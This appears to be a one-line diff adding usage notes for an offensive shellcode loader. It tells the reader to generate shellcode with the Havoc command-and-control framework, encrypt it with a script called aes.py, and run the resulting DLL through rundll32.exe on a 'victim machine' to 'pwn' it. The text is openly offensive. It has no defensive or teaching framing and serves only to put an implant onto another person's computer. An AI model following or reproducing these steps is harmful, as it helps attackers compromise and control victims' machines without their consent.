@@ -1,0 +1,1 @@
+Create a shellcode with Havoc, Then execute the command: "Python aes.py FILE_NAME.bin" and on the victim machine execute the command "rundll32.exe new.loader.dll DllRegisterServer" and there you have pwned the machine
